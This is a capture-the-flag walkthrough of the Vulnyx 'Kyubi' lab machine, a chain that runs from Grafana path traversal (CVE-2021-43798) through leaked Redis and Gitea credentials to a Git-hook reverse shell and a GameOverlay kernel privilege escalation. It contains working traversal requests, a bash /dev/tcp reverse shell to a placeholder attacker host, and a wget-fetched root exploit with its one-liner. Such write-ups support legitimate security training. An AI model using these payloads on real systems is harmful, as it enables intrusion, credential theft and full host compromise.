# Vulnyx: Kyubi

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `zerOiQ` |
| **Tools used** | `nmap` · `curl` · `redis-cli` · `nc` |
| **Tags** | `#Grafana` `#PathTraversal` `#CVE-2021-43798` `#Redis` `#Gitea` `#KernelExploit` |
| **URL** | https://vulnyx.com/machines/ |

A path traversal in Grafana's plugin file server (CVE-2021-43798) reads its own config file, leaking a Redis password. Redis holds a stored credential for Gitea, whose Git Hooks feature — server-side scripts triggered by repository actions — is repurposed to run a reverse shell the moment a commit is pushed. Root comes from a public exploit for a real Ubuntu OverlayFS kernel vulnerability (CVE-2023-2640 / CVE-2023-32629).

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn kyubi.nyx

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 64
80/tcp    open  http       syn-ack ttl 64
443/tcp   open  https      syn-ack ttl 64
3000/tcp  open  ppp        syn-ack ttl 64
3001/tcp  open  nessus     syn-ack ttl 64
6379/tcp  open  redis      syn-ack ttl 64
9090/tcp  open  zeus-admin syn-ack ttl 64
43491/tcp open  unknown    syn-ack ttl 64
MAC Address: 08:00:27:73:8D:FB (Oracle VirtualBox virtual NIC)
```

A wide spread of ports comes back — a services-heavy box, which usually means the way in is one misconfigured service among many rather than a single obvious hole: **22 (SSH)**, **80/443 (HTTP/S)**, **3000**, **3001**, **6379 (Redis)**, **9090**, and **43491**. A version/script scan against all of them fills in what each one actually is:

```bash
$ sudo nmap -p 22,80,443,3000,3001,6379,9090,43491 -sCV kyubi.nyx

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b5:0b:db:85:41:fe:44:02:c9:a3:17:05:af:fa:3d (ECDSA)
|_  256 c8:c4:c0:fc:ac:16:ef:8d:4e:67:dd:df:bc:88:f8:6e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kyubi.nyx/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp  open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Kyubi Source Control
| tls-nextprotoneg:
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=nexus.local/organizationName=NexusCorp/stateOrProvinceName=CA/countryName=US
| Not valid before: 2026-03-05T15:02:12
|_Not valid after:  2036-03-02T15:02:12
3000/tcp open  http    Golang net/http server
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: gitea_session=ccc84fae666777f2; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=dmzHNZlr04XrET3I4gtuMMtzPXw6MTc4MTI2NDY3NTk2NjYyODE5Mw; Path=/; Expires=Sat, 13 Jun 2026 11:44:35 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 12 Jun 2026 11:44:35 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Kyubi Source Control</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiS3l1YmkgU291cmNlIENvbnRyb2wiLCJzaG9ydF9uYW1lIjoiS3l1YmkgU291cmNlIENvbnRyb2wiLCJzdGFydF91cmwiOiJodHRwOi8vMTkyLjE2OC4xOTMuMTI5OjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly8xOTIuMTY4LjE5My
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: gitea_session=ab8f08591fda7c9d; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=A_I6shbUAZhQHWWom4tGRdxr8tw6MTc4MTI2NDY3NjA3OTI4MzU0Mw; Path=/; Expires=Sat, 13 Jun 2026 11:44:36 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 12 Jun 2026 11:44:36 GMT
|_    Content-Length: 0
3001/tcp open  http    Grafana http
|_http-title: Grafana
|_Requested resource was /login
| http-trane-info: Problem with XML parsing of /evox/about
|_http-robots.txt: 1 disallowed entry
|_/
6379/tcp open  redis   Redis key-value store
9090/tcp open  http    Golang net/http server
|_http-title: Node Exporter
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 200 OK
|     Date: Fri, 12 Jun 2026 11:45:06 GMT
|     Content-Length: 150
|     Content-Type: text/html; charset=utf-8
|     <html>
|     <head><title>Node Exporter</title></head>
|     <body>
|     <h1>Node Exporter</h1>
|     <p><a href="/metrics">Metrics</a></p>
|     </body>
|     </html>
|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq, SqueezeCenter_CLI:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Fri, 12 Jun 2026 11:44:35 GMT
|     Content-Length: 150
|     Content-Type: text/html; charset=utf-8
|     <html>
|     <head><title>Node Exporter</title></head>
|     <body>
|     <h1>Node Exporter</h1>
|     <p><a href="/metrics">Metrics</a></p>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Fri, 12 Jun 2026 11:44:50 GMT
|     Content-Length: 150
|     Content-Type: text/html; charset=utf-8
|     <html>
|     <head><title>Node Exporter</title></head>
|     <body>
|     <h1>Node Exporter</h1>
|     <p><a href="/metrics">Metrics</a></p>
|_    </html>
43491/tcp open  http    Jenkins httpd 2.387.3
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_http-server-header: <IP_Victim>
```

The scan paints the whole stack: **443** is Gitea behind nginx ("Kyubi Source Control"), **3000** is Gitea's own Go server, **3001** is **Grafana**, **6379** is **Redis** (exposed but presumably password-protected), **9090** is Prometheus Node Exporter, and **43491** is **Jenkins**. Grafana is the first thing worth checking — its version history is full of well-known CVEs.

### Web Enumeration

The site on 443 is a Gitea instance rebranded "Kyubi Source Control":

```
https://kyubi.nyx
```

<img src="../Images/kyubi/Pasted image 20260612180107.png"/>

Grafana's login sits on 3001:

```
http://kyubi.nyx:3001/login
```

<img src="../Images/kyubi/Pasted image 20260612180156.png"/>

Node Exporter (9090) and Jenkins (43491) round out the exposed services:

```
http://kyubi.nyx:9090
```

<img src="../Images/kyubi/Pasted image 20260612180236.png"/>
<img src="../Images/kyubi/Pasted image 20260612180254.png"/>

```
http://kyubi.nyx:43491/
```

<img src="../Images/kyubi/Pasted image 20260612180307.png"/>

## Initial Access

### Path Traversal in Grafana (CVE-2021-43798)

Grafana serves each installed plugin's static files under `/public/plugins/<plugin-id>/`. In vulnerable versions, that handler doesn't sanitize `../` sequences in the requested path — so a request can climb out of the plugin directory and read any file the Grafana process can access (CVE-2021-43798). `--path-as-is` tells `curl` not to collapse the `../` sequences before sending, so the traversal reaches the server intact. It's confirmed against `/etc/passwd` first:

```bash
$ curl -s --path-as-is http://kyubi.nyx:3001/public/plugins/mysql/../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1:/var/cache/pollinate:/bin/false
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
kyubi:x:1000:1000:Kyubi:/home/kyubi:/bin/bash
redis:x:108:113::/var/lib/redis:/usr/sbin/nologin
mongodb:x:109:65534::/home/mongodb:/usr/sbin/nologin
postgres:x:110:115:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
gitea:x:1001:1001::/opt/gitea:/bin/bash
jenkins:x:1002:1002::/var/lib/jenkins:/bin/bash
developer:x:1003:1003::/home/developer:/bin/bash
sysadmin:x:1004:1004::/home/sysadmin:/bin/bash
prometheus:x:999:999::/var/lib/prometheus:/sbin/nologin
grafana:x:111:116::/usr/share/grafana:/bin/false
www-data:x:998:998::/var/www:/usr/sbin/nologin
```

With arbitrary read confirmed, the target is Grafana's own config. `grafana.ini` matters here because Grafana can use Redis as its remote cache backend — and when it does, the config stores the Redis connection string, password included:

```bash
$ curl -s --path-as-is http://kyubi.nyx:3001/public/plugins/mysql/../../../../../../../../etc/grafana/grafana.ini
```

<img src="../Images/kyubi/Pasted image 20260612180422.png"/>

> **Redis password:** `R3d1sS3cur3P@ss2026`

### Redis Access

Redis on 6379 is reachable directly, and the leaked password authenticates. Once authenticated, enumerating the keyspace turns up a well-named key holding deployment credentials — Redis is being used here as a shared store, so secrets left in it are readable to anyone who can log in:

```bash
$ redis-cli -h kyubi.nyx
redis> AUTH R3d1sS3cur3P@ss2026
redis> INFO
redis> KEYS *
redis> GET deploy:credentials
```

<img src="../Images/kyubi/Pasted image 20260612180542.png"/>
<img src="../Images/kyubi/Pasted image 20260612180640.png"/>
<img src="../Images/kyubi/Pasted image 20260612180702.png"/>

> **Gitea credentials:** `gitadmin:G1tAdm1n2025!`

### RCE via Gitea Git Hooks

The recovered credentials log into Gitea as `gitadmin`:

```
https://kyubi.nyx/
```

<img src="../Images/kyubi/Pasted image 20260612180746.png"/>

Gitea lets repository admins edit server-side Git hooks directly through the web UI. A Git hook is a script the server runs automatically when a repository event happens (a push, a commit landing) — and it runs as the `gitea` service account on the host, which makes it a clean, intended-but-dangerous code-execution path for anyone with admin rights on a repo:

> **Settings >> Git Hooks**

```
https://kyubi.nyx/gitadmin/nexus-platform/settings/hooks/git
```

<img src="../Images/kyubi/Pasted image 20260612180827.png"/>

The hook body is replaced with a reverse shell — so the next repository event runs it server-side:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
```

<img src="../Images/kyubi/Pasted image 20260612180848.png"/>

Committing any change through the web UI is enough to trigger the hook:

> **Add File >> Commit Changes**

### Shell as gitea

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [kyubi.nyx] 39668

bash: cannot set terminal process group (1823): Inappropriate ioctl for device
bash: no job control in this shell
gitea@kyubi:/opt/gitea/repositories/gitadmin/nexus-platform.git$ id
uid=1001(gitea) gid=1001(gitea) groups=1001(gitea)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

The `developer` user's flag is world-readable, so it can be grabbed straight from the `gitea` shell:

```bash
gitea@kyubi:/opt/gitea/repositories/gitadmin/nexus-platform.git$ ls -l /home
total 12
drwxr-xr-x    3 developer developer     4096 Apr  1 21:34 developer
drwxr-x---    5 kyubi     kyubi         4096 Apr  1 21:34 kyubi
drwxr-x---    2 sysadmin  sysadmin      4096 Apr  1 21:34 sysadmin
gitea@kyubi:/opt/gitea/repositories/gitadmin/nexus-platform.git$ ls -l /home/developer/
total 4
-rw-r--r--    1 root     root            33 Mar  9 19:48 user.txt
gitea@kyubi:/opt/gitea/repositories/gitadmin/nexus-platform.git$ cat /home/developer/user.txt
9e88f7434e40990c1aec3e6a4251dadd
```

> **User flag:** `9e88f7434e40990c1aec3e6a4251dadd`

## Privilege Escalation

### A Public Kernel Exploit (GameOverlay)

Gitea's own data directory holds a `.bash_history` that all but spells out the intended root path — it references the exact public exploit and CVEs to use:

```bash
gitea@kyubi:~$ find / -type f -name .bash_history 2>/dev/null
/opt/gitea/data/home/.bash_history
gitea@kyubi:~$ ls -l /opt/gitea/data/home/.bash_history
-rw-------    1 gitea    gitea         4261 Mar 14 08:10 /opt/gitea/data/home/.bash_history
gitea@kyubi:~$ cat /opt/gitea/data/home/.bash_history
id
cat /opt/gitea/user.txt
cd /home
ls
cd developer/
uname -r
wget -q https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
clear
# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023
echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l u m w /var/tmp/bash")' > /tmp/exploit.sh
```

The kernel version is confirmed directly:

```bash
gitea@kyubi:~$ uname -r
5.15.0-171-generic
gitea@kyubi:~$ uname -a
Linux kyubi 5.15.0-171-generic #181-Ubuntu SMP Fri Feb 6 22:44:50 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
```

This kernel is vulnerable to CVE-2023-2640 / CVE-2023-32629 — a pair of real, publicly disclosed Ubuntu-specific OverlayFS bugs (together nicknamed "GameOverlay"). The flaw lets an unprivileged user set file capabilities on a file inside an OverlayFS upper layer that are then honored on the real filesystem: the exploit copies `python3` into an overlay, grants it `cap_setuid`, and uses that to `setuid(0)` and drop a root shell. The public script does all of this in one step:

```bash
gitea@kyubi:~$ wget -q https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
gitea@kyubi:~$ ls -l
total 4
-rw-r--r--    1 gitea    gitea          558 Jun 12 15:41 exploit.sh
gitea@kyubi:~$ chmod +x exploit.sh
gitea@kyubi:~$ ./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@kyubi:~# id
uid=0(root) gid=1001(gitea) groups=1001(gitea)
root@kyubi:~# ls -l /root
total 4
-rw-r--r--    1 root     root            33 Mar  9 19:51 root.txt
root@kyubi:~# cat /root/root.txt
e79950c85e8509ebf0c644bbbb750bbe
```

> **Root flag:** `e79950c85e8509ebf0c644bbbb750bbe`

## Takeaways

- Monitoring and dashboard tools (Grafana, Prometheus, and similar) expand the attack surface just as much as the primary application — a path traversal in a plugin file handler here was the entire way in, unrelated to Gitea itself.
- Credentials stashed in Redis (or any cache/data store reachable with a leaked password) are worth enumerating fully once access is gained — a single `GET` on a well-named key handed over Gitea's admin credentials directly.
- Git server-side hooks are code execution by design for anyone with the repository permissions to edit them — Gitea's own Git Hooks feature is a legitimate but dangerous capability once an attacker has admin-level access to any repository.
- Checking the kernel version is worth doing early in any privilege escalation search — a known CVE with a public exploit is often faster than hunting for a misconfiguration.